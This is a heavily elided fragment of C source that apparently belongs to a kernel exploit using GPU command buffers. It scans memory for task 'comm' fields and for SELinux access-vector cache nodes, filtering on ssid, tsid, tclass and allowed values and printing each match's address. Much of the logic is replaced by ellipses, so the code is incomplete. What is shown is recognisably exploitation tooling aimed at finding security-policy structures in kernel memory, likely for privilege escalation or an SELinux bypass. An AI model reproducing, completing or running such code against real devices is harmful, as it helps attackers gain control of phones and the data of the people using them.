...
static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
                     size_t ib_bytes, unsigned int ib_id,
                     unsigned int *out_ts) {
    ...
    while (va < end_va && n < maxout) {
        ...
        for (int p = 0; p < batch; p++) {
            ...
            if (found && n < maxout) {
                ...
                printf("[TASK] found comm at va=0x%lx\n",
...
static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
    ...
    if (stride < 16 || stride > 128) {
        printf("[-] Invalid stride %d, skipping\n", stride);
        return 0;
    }
    uint32_t *cmd = (uint32_t *)ib_m;
    uint32_t *data = (uint32_t *)dst_m;
        ...
        for (int p = 0; p < batch; p++) {
            ...
            for (int n = 0; n < nodes_per_page; n++) {
                ...
                if (ssid >= 1 && ssid <= 0x3fff &&
                    tsid == 2 &&
                    (tclass == 1 || tclass == 2) &&
                    (allowed != 0xffffffff && allowed != 0)) {
                    total_nodes++;
                    printf("[AVC_NODE] stride=%d va=0x%lx+0x%x ssid=%u tsid=%u tclass=%u allowed=0x%08x\n",
                           stride, (unsigned long)va, n * stride,
...
int main(int argc, char **argv) {
    ...
    int found = 0;
    int best_stride = 0;
    printf("[AVC] Starting scan (stride from %d upward)\n", start_stride);
    for (int si = start_idx; si < num_strides; si++) {
        int s = strides[si];
